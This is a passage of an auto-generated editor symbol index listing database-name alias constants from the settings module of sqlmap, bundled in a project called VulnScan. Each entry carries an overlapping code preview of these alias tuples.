        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PGSQL_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORACLE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLITE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ACCESS_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAXDB_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SYBASE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DB2_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "H2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFORMIX_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MONETDB_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DERBY_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRESTO_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIMERSQL_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRATEDB_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUBRID_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CUBRID_ALIASES = (\"cubrid\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXTREMEDB_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FRONTBASE_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
